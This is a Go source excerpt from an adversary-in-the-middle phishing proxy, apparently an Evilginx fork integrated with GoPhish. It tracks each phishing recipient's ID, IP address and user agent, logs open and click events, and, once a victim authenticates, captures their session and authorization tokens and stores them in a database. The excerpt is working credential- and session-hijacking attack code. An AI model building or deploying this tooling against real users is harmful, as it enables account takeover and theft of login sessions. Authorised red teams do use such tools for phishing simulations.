...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			recipient_id_regex, _ := regexp.Compile(`client_id=([^\"]*)`)
			tracker_regex, _ := regexp.Compile(`track\?client_id=`)
			...
			// Remote Addr should be set to the webserver, not Evilnginx
			// parts := strings.SplitN(req.RemoteAddr, ":", 2)
			// remote_addr := parts[0]
			remote_addr := req.Header.Get("X-Forwarded-For")

			// We want to grab this before the session is handled and the domain is checked.
			tracker_match := tracker_regex.FindString(req_url)
			recipient_id_match := recipient_id_regex.FindString(req_url)

			// If we have a match for the RID, we should parse the data.
			if len(recipient_id_match) != 0 {
				log.Debug("rid: %s", recipient_id_match)
				gpe.ClientID = strings.Split(recipient_id_match, "=")[1]
				gpe.Browser = map[string]string{"address": req.RemoteAddr, "orig-address": req.Header.Get("X-Forwarded-For"), "user-agent": req.UserAgent()}

				// If the request is for the tracker, it's an open, else, it's just a click.
				// In GoPhish, an open implies a click.
				if len(tracker_match) != 0 {
					log.Debug("tracker: %s", tracker_match)
					gpe.Event = EventClicked
				} else {
					gpe.Event = EventOpened
				}
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			if is_auth {
				...
				s, ok := p.sessions[ps.SessionId]
				if ok && len(s.GoPhish.ClientID) != 0 {
					log.Success("[%d] all authorization tokens intercepted!", ps.Index)
					s.GoPhish.Event = EventSessionCaptured
					s.GoPhish.Tokens = s.Tokens
					err := database.HandleGoPhishEvent(s.GoPhish)
					if err != nil {
						log.Error("failed to add %s event to database: %s", s.GoPhish.Event, err)
					}
				}
			}
